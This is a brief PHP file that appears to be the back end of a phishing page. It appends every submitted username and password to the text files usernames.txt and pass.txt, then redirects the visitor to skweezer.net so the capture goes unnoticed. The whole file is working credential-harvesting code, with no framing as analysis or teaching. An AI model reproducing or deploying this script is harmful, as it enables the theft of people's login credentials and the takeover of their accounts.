<?php

    file_put_contents("usernames.txt",  $_POST['username'] .  "\n", FILE_APPEND);
file_put_contents("pass.txt", $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://skweezer.net');
exit();
